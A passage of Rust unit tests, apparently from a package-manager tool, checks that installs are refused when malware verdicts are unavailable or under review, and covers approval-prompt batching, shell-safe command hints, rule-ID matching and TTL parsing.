    fn previews_refuse_allow_malware_when_the_verdict_is_unavailable() {
        let previews = HashMap::from([(
            "foldrun@32.8.2".to_string(),
            Preview::Unavailable("offline".into()),
        )]);

        let error = check_previews(&specs(&["foldrun@32.8.2"]), &previews, true).unwrap_err();

        assert!(error.to_string().contains("couldn't check"), "{error}");
    }

    #[test]
    fn previews_refuse_a_server_review_hold() {
        let previews = HashMap::from([(
            "foldrun@32.8.2".to_string(),
            blocked("lpm_administrative_review", "clean"),
        )]);

        for allow_malware in [false, true] {
            let error =
                check_previews(&specs(&["foldrun@32.8.2"]), &previews, allow_malware).unwrap_err();
            assert!(error.to_string().contains("held for LPM review"), "{error}");
        }
    }

    #[test]
    fn approval_batches_keep_each_prompt_whole() {
        let short = specs(&[
            "a@1.0.0", "b@1.0.0", "c@1.0.0", "d@1.0.0", "e@1.0.0", "f@1.0.0",
        ]);
        let long_a = format!("{}@1.0.0", "a".repeat(200));
        let long_b = format!("{}@1.0.0", "b".repeat(200));
        let long = specs(&[&long_a, &long_b, "c@1.0.0"]);
        let prompt_for =
            |batch: &[&FirewallBypassSpec]| approval_prompt(batch, &global(), None, false);
        let sizes = |raw: &[FirewallBypassSpec]| {
            approval_batches(&refs(raw), prompt_for)
                .iter()
                .map(Vec::len)
                .collect::<Vec<_>>()
        };

        assert_eq!(sizes(&short), [5, 1]);
        assert_eq!(sizes(&long), [1, 2]);
        for batch in approval_batches(&refs(&long), prompt_for) {
            let within_budget = prompt_for(&batch).chars().count() <= MAX_APPROVAL_PROMPT_CHARS;
            assert!(within_budget || batch.len() == 1, "{batch:?}");
        }
    }

    #[test]
    fn add_command_hint_is_left_out_for_a_name_a_shell_would_expand() {
        assert_eq!(
            add_command_hint(&refs(&specs(&["bang!tool@1.0.0"])), &global(), None, false),
            None
        );
    }

    #[test]
    fn rule_ids_are_recognised_only_in_their_exact_form() {
        assert!(is_rule_id("fwb_0123456789ab"));
        for target in [
            "fwb_utils",
            "fwb_0123456789AB",
            "fwb_0123456789abc",
            "foldrun",
        ] {
            assert!(!is_rule_id(target), "{target}");
        }
    }

    #[test]
    fn the_hinted_ttl_reads_back_as_the_same_duration() {
        for secs in [90, 60, 5_400, 86_400, 2 * 86_400 + 1] {
            assert_eq!(parse_ttl(Some(&ttl_argument(secs))).unwrap(), Some(secs));
        }
    }
}
